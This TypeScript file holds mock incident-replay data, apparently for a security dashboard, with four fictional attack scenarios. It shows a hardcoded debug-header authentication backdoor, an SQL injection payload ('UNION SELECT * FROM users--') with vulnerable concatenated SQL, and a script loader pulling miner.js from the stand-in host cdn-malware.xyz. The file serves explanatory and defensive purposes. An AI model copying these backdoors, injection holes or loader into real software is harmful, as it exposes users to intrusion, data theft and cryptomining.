export interface TimelineNode {
  id: string;
  label: string;
  type: 'request' | 'gateway' | 'service' | 'database' | 'code';
  status: 'normal' | 'suspicious' | 'compromised';
  timestamp: string;
  details: {
    key: string;
    value: string;
  }[];
  codeContext?: {
    file: string;
    function: string;
    line: number;
    snippet: string;
  };
}

export interface IncidentReplayData {
  id: string;
  type: string;
  service: string;
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  time_detected: string;
  description: string;
  ai_analysis: string;
  timeline: TimelineNode[];
}

export const incidentScenarios: IncidentReplayData[] = [
  {
    id: "INC-2024-091",
    type: "Authentication Bypass",
    service: "auth-service",
    severity: "Critical",
    time_detected: "2024-05-12 14:32:05 UTC",
    description: "An external request successfully bypassed authentication middleware using a debug header override.",
    ai_analysis: "The request bypassed authentication due to a hardcoded debug header pattern (`X-Debug-Root`). This condition allowed unauthorized access without credential validation. The logic failure occurred in the `authMiddleware.js` file where a development backdoor was left active in production.",
    timeline: [
      {
        id: "node-1",
        label: "Incoming Request",
        type: "request",
        status: "normal",
        timestamp: "14:32:05.102",
        details: [
          { key: "IP", value: "203.0.113.42" },
          { key: "Method", value: "POST /admin/reset-db" },
          { key: "Headers", value: "X-Debug-Root: super_secret_override" }
        ]
      },
      {
        id: "node-2",
        label: "API Gateway",
        type: "gateway",
        status: "normal",
        timestamp: "14:32:05.125",
        details: [
          { key: "Route", value: "/auth/v1/admin" },
          { key: "Rate Limit", value: "Pass" }
        ]
      },
      {
        id: "node-3",
        label: "Auth Middleware",
        type: "service",
        status: "suspicious",
        timestamp: "14:32:05.140",
        details: [
          { key: "Logic", value: "Header Check" },
          { key: "Outcome", value: "Bypass Triggered" }
        ]
      },
      {
        id: "node-4",
        label: "Business Logic",
        type: "service",
        status: "compromised",
        timestamp: "14:32:05.155",
        details: [
          { key: "Action", value: "Admin Privileges Granted" },
          { key: "User Context", value: "system-root" }
        ]
      },
      {
        id: "node-5",
        label: "Code Execution",
        type: "code",
        status: "compromised",
        timestamp: "14:32:05.158",
        details: [
          { key: "File", value: "authMiddleware.js" },
          { key: "Line", value: "142" }
        ],
        codeContext: {
          file: "authMiddleware.js",
          function: "validateRequest()",
          line: 142,
          snippet: `140:   if (req.headers['x-api-key'] === VALID_API_KEY) {
141:     next();
142:   } else if (req.headers['x-debug-root'] === "super_secret_override") {
143:     // VULNERABILITY: Bypass auth
144:     console.log("Root override accessing system...");
145:     next();
146:   } else {`
        }
      }
    ]
  },
  {
    id: "INC-2024-095",
    type: "SQL Injection",
    service: "inventory-service",
    severity: "High",
    time_detected: "2024-05-14 09:15:22 UTC",
    description: "Malicious payload detected in search query parameter attempting to extract user data.",
    ai_analysis: "The application failed to sanitize the 'q' query parameter in the product search endpoint. The attacker injected a UNION SELECT statement to retrieve data from the 'users' table. The vulnerability stems from direct string concatenation in the SQL query builder.",
    timeline: [
      {
        id: "node-1",
        label: "Malicious Request",
        type: "request",
        status: "suspicious",
        timestamp: "09:15:22.005",
        details: [
          { key: "IP", value: "198.51.100.23" },
          { key: "Path", value: "/api/products/search" },
          { key: "Query", value: "' UNION SELECT * FROM users--" }
        ]
      },
      {
        id: "node-2",
        label: "WAF Inspection",
        type: "gateway",
        status: "suspicious",
        timestamp: "09:15:22.010",
        details: [
          { key: "Rule", value: "SQLi Pattern" },
          { key: "Confidence", value: "85%" },
          { key: "Action", value: "Flagged" }
        ]
      },
      {
        id: "node-3",
        label: "Product Service",
        type: "service",
        status: "compromised",
        timestamp: "09:15:22.025",
        details: [
          { key: "Component", value: "SearchController" },
          { key: "Input", value: "Raw SQL String" }
        ]
      },
      {
        id: "node-4",
        label: "Database Query",
        type: "database",
        status: "compromised",
        timestamp: "09:15:22.035",
        details: [
          { key: "DB", value: "PostgreSQL" },
          { key: "Query", value: "SELECT ... UNION SELECT..." }
        ]
      },
      {
        id: "node-5",
        label: "Code Defect",
        type: "code",
        status: "compromised",
        timestamp: "09:15:22.038",
        details: [
          { key: "File", value: "SearchController.ts" },
          { key: "Line", value: "45" }
        ],
        codeContext: {
          file: "SearchController.ts",
          function: "searchProducts()",
          line: 45,
          snippet: `43:     const searchTerm = req.query.q;
44:     // VULNERABILITY: SQL Injection
45:     const query = "SELECT * FROM products WHERE name LIKE '%" + searchTerm + "%'";
46:     const results = await db.query(query);
47:     res.json(results);`
        }
      }
    ]
  },
  {
    id: "INC-2024-102",
    type: "DDoS / Resource Exhaustion",
    service: "payment-gateway",
    severity: "High",
    time_detected: "2024-06-01 04:20:11 UTC",
    description: "Sudden spike in traffic targeting the checkout API, causing 503 errors and high latency.",
    ai_analysis: "Traffic analysis reveals a coordinated botnet attack targeting `/api/checkout`. The request pattern bypassed standard rate limiting by rotating IP addresses across 4,000+ distinct subnets. The payload size was manipulated to exhaust memory buffers in the payment processing service.",
    timeline: [
      {
        id: "node-1",
        label: "Traffic Spike",
        type: "request",
        status: "suspicious",
        timestamp: "04:20:11.000",
        details: [
          { key: "RPS", value: "25,000" },
          { key: "Source", value: "Global Botnet" }
        ]
      },
      {
        id: "node-2",
        label: "Load Balancer",
        type: "gateway",
        status: "compromised",
        timestamp: "04:20:11.500",
        details: [
          { key: "Status", value: "Degraded" },
          { key: "Latency", value: "1200ms" }
        ]
      },
      {
        id: "node-3",
        label: "Payment Service",
        type: "service",
        status: "compromised",
        timestamp: "04:20:12.000",
        details: [
          { key: "Error Rate", value: "98%" },
          { key: "Resource", value: "OOM Kill" }
        ]
      },
      {
        id: "node-4",
        label: "Auto-Scaler",
        type: "service",
        status: "normal",
        timestamp: "04:20:15.000",
        details: [
          { key: "Action", value: "Scale Up (+10 pods)" },
          { key: "Result", value: "Insufficient" }
        ]
      },
      {
        id: "node-5",
        label: "WAF Mitigation",
        type: "gateway",
        status: "normal",
        timestamp: "04:20:45.000",
        details: [
          { key: "Action", value: "Geo-Block / Challenge" },
          { key: "Effect", value: "Traffic Dropped" }
        ]
      }
    ]
  },
  {
    id: "INC-2024-115",
    type: "Supply Chain Compromise",
    service: "frontend-assets",
    severity: "Critical",
    time_detected: "2024-06-15 11:05:00 UTC",
    description: "Malicious JavaScript detected serving crypto-mining warnings to end-users.",
    ai_analysis: "A third-party dependency `react-ui-kit-v2` was compromised upstream (version 1.4.2). The malicious version injected a script loader pointing to `cdn-malware.xyz`. This script attempted to exfiltrate local storage tokens and utilize user CPU for mining operations.",
    timeline: [
      {
        id: "node-1",
        label: "Build Pipeline",
        type: "code",
        status: "compromised",
        timestamp: "02:00:00.000",
        details: [
          { key: "Action", value: "npm install" },
          { key: "Package", value: "react-ui-kit-v2@1.4.2" }
        ]
      },
      {
        id: "node-2",
        label: "Deployment",
        type: "service",
        status: "normal",
        timestamp: "02:15:00.000",
        details: [
          { key: "Environment", value: "Production" },
          { key: "Deploy ID", value: "dep-8921" }
        ]
      },
      {
        id: "node-3",
        label: "User Reports",
        type: "request",
        status: "suspicious",
        timestamp: "11:00:00.000",
        details: [
          { key: "Source", value: "CSP Violation Reports" },
          { key: "Domain", value: "cdn-malware.xyz" }
        ]
      },
      {
        id: "node-4",
        label: "Threat Intel",
        type: "gateway",
        status: "suspicious",
        timestamp: "11:05:00.000",
        details: [
          { key: "Signature", value: "Known Malware Domain" },
          { key: "Confidence", value: "100%" }
        ]
      },
      {
        id: "node-5",
        label: "Code Analysis",
        type: "code",
        status: "compromised",
        timestamp: "11:10:00.000",
        details: [
          { key: "File", value: "node_modules/.../index.js" },
          { key: "Snippet", value: "eval(atob('...'))" }
        ],
        codeContext: {
          file: "node_modules/react-ui-kit-v2/dist/index.js",
          function: "init()",
          line: 1,
          snippet: `1: (function(){var s=document.createElement('script');
2: s.src='https://cdn-malware.xyz/miner.js';
3: document.head.appendChild(s);})();`
        }
      }
    ]
  }
];

export const mockIncidentData = incidentScenarios[0]; // Default export for backwards compatibility
